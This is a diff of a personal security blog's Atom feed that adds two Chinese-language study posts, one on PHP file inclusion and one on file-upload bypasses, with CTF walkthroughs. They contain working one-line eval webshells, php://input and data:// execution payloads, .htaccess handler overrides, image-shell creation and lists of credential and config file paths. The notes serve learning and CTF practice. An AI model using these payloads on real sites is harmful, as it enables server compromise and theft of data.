@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-14T08:57:31.324Z</updated>
+    <updated>2022-04-14T09:02:44.698Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://z0ekball.github.io"/>
     <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
@@ -50,6 +50,232 @@ input('提示内容')
 </code></pre>
 <h1 id=""></h1>
 ]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[文件包含]]></title>
+        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
+        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
+        </link>
+        <updated>2021-07-29T02:59:27.000Z</updated>
+        <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
+<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
+require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
+include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
+</code></pre>
+<p><code>敏感路径</code>：</p>
+<p>典型：</p>
+<pre><code class="language-php">?page=a.php
+?home=b.html
+?file=content…
+</code></pre>
+<p>Windows：</p>
+<pre><code class="language-php">C:\boot.ini //查看系统版本
+C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
+C:\windows\repair\sam //存储 windows 系统初次安装的密码
+C:\Program Files\mysql\my.ini //mysql 配置
+C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
+C:\windows\php.ini //php 配置信息
+C:\windows\my.ini //mysql 配置文件
+</code></pre>
+<p>UNIX/Linux：</p>
+<pre><code class="language-php">/etc/passwd
+/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/php5/lib/php.ini //PHP 相关配置
+/etc/httpd/conf/httpd.conf //apache
+/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
+</code></pre>
+<h4 id="本地包含">本地包含</h4>
+<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
+<p>1.txt:</p>
+<pre><code class="language-php">&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>1.php:</p>
+<pre><code class="language-php">&lt;?php
+$b=$_GET['id'];
+include($b);
+?&gt;
+</code></pre>
+<p><code>playload</code>:</p>
+<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
+</code></pre>
+<h4 id="远程包含">远程包含</h4>
+<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
+Allow_url_include = on、allow_url_fopen=on</p>
+<p><code>playload</code>:</p>
+<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
+</code></pre>
+<h4 id="php伪协议">php伪协议</h4>
+<p><code>file://</code>:</p>
+<p>用于访问本地文件系统</p>
+<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
+<pre><code class="language-php">file：//[文件的绝对路径和文件名]
+    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+file：//[文件的相对路径和文件名]
+    file=./phpinfo.txt
+file：//[http：//网络路径和文件名]
+    file=http://127.0.0.1/phpinfo.txt 
+</code></pre>
+<p><code>php：//filter</code>：</p>
+<p>用于读取源码并进行bash64编码输出；<br>
+条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
+<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
+（针对php文件需要base64编码）
+</code></pre>
+<p><code>php：//input</code>：</p>
+<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
+条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
+<pre><code class="language-php">php://input + [POST DATA]执行php代码
+</code></pre>
+<p>有写入权限则可以写入一句话木马</p>
+<pre><code class="language-php">php://input
+[POST DATA部分]
+&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
+</code></pre>
+<p><code>php://stdin</code>:</p>
+<p>只读，php://stdout 和 php://stderr 是只写的。</p>
+<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
+<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
+<p><code>zip://,bzip://,zlib://</code>:</p>
+<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
+<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
+<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
+bzip2://file.bz2
+zlib://file.gz
+</code></pre>
+<p><code>data://</code>：</p>
+<p>传递相应格式数据，用于执行php代码</p>
+<p>条件：    allow_url_fope   on    allow_url_include on</p>
+<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<p><code>phar：//</code></p>
+<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[文件上传]]></title>
+        <id>https://z0ekball.github.io/post/wen-jian-shang-chuan/</id>
+        <link href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
+        </link>
+        <updated>2021-07-27T08:23:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="文件上传漏洞">文件上传漏洞</h2>
+<h3 id="1无验证">1.无验证</h3>
+<p>也就是前端和后端都不过滤上传的文件，故只需传入含一句话木马</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
+</code></pre>
+<p>的php文件，再用菜刀或者蚁剑连接即可。</p>
+<h3 id="2js前端验证">2.js前端验证</h3>
+<p>顾名思义，就是只在浏览器前端进行简单的文件名过滤，只允许上传某种文件名。简单粗暴的做法是直接禁用浏览器里的js代码。<br>
+<code>绕过方法</code>：把含有一句话木马的php文件改成允许上传的文件名，上传并抓包，修改文件后缀为php再放包即可。</p>
+<h3 id="3mime绕过">3.MIME绕过</h3>
+<p>上传php木马，抓包修改Content-Type为合法类型即可</p>
+<p>例如：image/gif</p>
+<h3 id="4htaccess">4.htaccess</h3>
+<p><code>htaccess文件</code>：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。在文件上传中构造htaccess文件能使png以php格式解析。</p>
+<p><code>和httpdp.com区别</code>：只作用于当前目录，只在访问当前目录才加载</p>
+<p><code>漏洞利用</code></p>
+<pre><code class="language-php">//方法一
+SetHandler application/x-httpd-php  	//所有的文件当做php文件来解析
+//方法二
+AddType application/x-httpd-php .png	//.png文件当作php文件解析
+</code></pre>
+<p>在htaccess文件中写入代码并上传，再上传写有一句话木马的png文件，蚁剑连接即可。</p>
+<h3 id="5文件头检查">5.文件头检查</h3>
+<p>前面都是把含有一句话木马的php文件改变后缀变成png或者gif等可上传文件，而文件头检查则检查该文件的特征值，判断时候是真的png或者gif，故需要进一步伪装文件头。</p>
+<p><code>绕过方法</code>:制作图马，简单图马是直接把一句话木马放在图片末尾以绕过文件头检查</p>
+<pre><code class="language-php">//命令行合成图马
+copy 1.png/b+1.txt/a 2.png
+//b,a表示合成时各文件的编码方式，b为二进制，a为ascll
+</code></pre>
+<p><code>二次渲染</code>：同样也是检测文件是否是真的png或gif，上传之后的图片会被二次渲染，使得图马中的一句话木马变成乱码无法执行</p>
+<p><code>绕过方法</code>：下载被二次渲染后的图马与原来的图马比较，找到相同的地方，插入一句话木马。</p>
+<p>（png、jpg、jpeg都不好改，gif好改）</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211018165017388.png" alt="image-20211018165017388" style="zoom: 50%;" />
+<p>上传图马，配合解析漏洞、文件包含漏洞等使图马以php格式执行即可。</p>
+<h3 id="6解析漏洞">6.解析漏洞</h3>
+<h4 id="00截断攻击">00截断攻击</h4>
+<p><code>漏洞原理</code>：系统端解析文件格式和服务端解析文件格式的顺序不同，系统端由后往前解析，服务端反之。抓包将 xxx.php.gif 换成 xxx.php_gif(下划线为0x00)。在上传文件时系统文件遇到0x00。会认为文件已经结束。从而将xxx.php.gif的内容写入到xxx.php。（需要允许修改保存路径）</p>
+<p><code>绕过方法</code>：</p>
+<p>GET方式上传：抓包，在保存路径后面添加1.php%00（%00会自动解码），文件名不变仍为1.gif</p>
+<p>POST方式上传：抓包，在保存路径后面添加1.php+在HEX界面找到这个加号修改为00，文件名仍不变为1.gif</p>
+<h4 id="黑名单绕过">黑名单绕过</h4>
+<p><code>绕过方法</code>：</p>
+<p>1、文件名大小写绕过（AsP, pHp等等）<br>
+2、黑白名单列表绕过（php、php2、php3、php5、phtml、asp、aspx、ascx、ashx、cer、asa、jsp、jspx）cdx，<br>
+3、特殊文件名绕过：修改数据包里的文件名改为 test.php. 或者 test.asp_ (下划线是空格)由于这种命名格式在windows系统里是不允许的。所以在绕过上传之后windows系统会自动去掉 点和空格。Unix/Linux系统没有这个特性。<br>
+4、0x00截断绕过<br>
+5、.htaccess文件攻击（结合黑名单攻击）</p>
+<h4 id="apache解析漏洞">Apache解析漏洞</h4>
+<p><code>漏洞原理</code>：一个文件名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往php的位置开始尝试解析 ，如果ccc不属于Apache能解析的后缀名，那么Apache就会尝试去解析bbb，这样一直往前尝试，直到遇到一个能解析的拓展名为止</p>
+<p><code>绕过方法</code>:添加无用扩展名如xxx.php --&gt;xxx.php.aaa</p>
+<h4 id="iis解析漏洞">IIS解析漏洞</h4>
+<p><code>IIS6.0解析漏洞</code>：</p>
+<p>1.目录解析：以.asp 、.asa、.cer、.cdx命名的文件夹里的文件都将会被当成ASP文件执行。</p>
+<p>2.文件解析：只要文件名中含有.asp;、.asa;、.cer;、.cdx;会优先按 asp来解析，.asp;.jpg 这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
+<p><code>IIS7.0/7.5解析漏洞</code>:</p>
+<p>对任意文件名只要在URL后面追加上字符串&quot;/任意文件名.php&quot;,就会按照 php 的方式去解析<br>
+如”http://url/upload/1.jpg/1adf.php”</p>
+<h2 id="练习题目">练习题目</h2>
+<h3 id="极客大挑战-2019upload1">[极客大挑战 2019]Upload1</h3>
+<p><code>MIME绕过</code>和<code>黑名单绕过</code>，只允许上传图片，对php有简单过滤。</p>
+<p>上传一句话木马</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
+</code></pre>
+<p>抓包修改</p>
+<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019164716089.png" alt="image-20211019164716089" loading="lazy"></figure>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019164731251.png" alt="image-20211019164731251" style="zoom: 33%;" />
+<p>对内容有过滤，换一个木马</p>
+<pre><code class="language-php">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[pass])&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019165114142.png" alt="image-20211019165114142" loading="lazy"></figure>
+<p>成功</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165418509.png" alt="image-20211019165418509" style="zoom: 33%;" />
+<p>访问该文件upload/2.phtml</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165551551.png" alt="image-20211019165551551" style="zoom:50%;" />
+<p>说明存在该文件，蚁剑连接</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170411685.png" alt="image-20211019170411685" style="zoom:67%;" />
+<p>找到flag</p>
+<h3 id="actf2020-新生赛upload1">[ACTF2020 新生赛]Upload1</h3>
+<p><code>前端过滤</code></p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170918935.png" alt="image-20211019170918935" style="zoom: 67%;" />
+<p>把文件改成gif，抓包再改成php</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019171957129.png" alt="image-20211019171957129" style="zoom: 80%;" />
+<p>修改<img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019172023103.png" alt="image-20211019172023103" loading="lazy"></p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172352138.png" alt="image-20211019172352138" style="zoom:67%;" />
+<p>emmmphp也要绕一下改成phtml</p>
+<figure data-type="image" tabindex="3"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019172444434.png" alt="image-20211019172444434" loading="lazy"></figure>
+<p>有了，访问该页面</p>
+<figure data-type="image" tabindex="4"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019172549473.png" alt="image-20211019172549473" loading="lazy"></figure>
+<p>蚁剑一下，用命令行找到flag</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019173439257.png" alt="image-20211019173439257" style="zoom:67%;" />
+<h3 id="mrctf2020你传你呢1">[MRCTF2020]你传你🐎呢1</h3>
+<p><code>htaccess绕过</code></p>
+<pre><code class="language-php">//把hack.png解析成php
+&lt;FilesMatch &quot;hack.png&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre>
+<p>上传htaccess文件，抓包修改类型为png</p>
+<figure data-type="image" tabindex="5"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019180047323.png" alt="image-20211019180047323" loading="lazy"></figure>
+<p>再上传一个含有木马的假png，上传成功</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019175206673.png" alt="image-20211019175206673" style="zoom: 50%;" />
+<p>蚁剑一下，找到flag</p>
+<h3 id="第二章-web进阶文件上传1">[第二章 web进阶]文件上传1</h3>
+<p>题目直接给出了源码，得到过滤信息：</p>
+<p>1.仅允许上传zip、jpg、gif、png文件<br>
+2.如果上传压缩包，压缩包内不允许含有php文件</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183807280.png" alt="image-20211019183807280" style="zoom:67%;" />
+<p>上传一个含有php的zip</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183103048.png" alt="image-20211019183103048" style="zoom:50%;" />
+<p>要绕过php，改成phtml，上传成功，问题是不知道路径</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183524005.png" alt="image-20211019183524005" style="zoom:67%;" />
+<p>上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下</p>
+<p>010 editor修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）</p>
+<figure data-type="image" tabindex="6"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019191350117.png" alt="image-20211019191350117" loading="lazy"></figure>
+<p>emmmm，御剑连上了但打不开，文件名换成php.xx(<code>Apache解析漏洞</code>)</p>
+<p>上传后访问，得到flag</p>
+<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019192014051.png" alt="image-20211019192014051" style="zoom:67%;" />]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[sqli-labs(11~20)脚本、sqlmap学习]]></title>
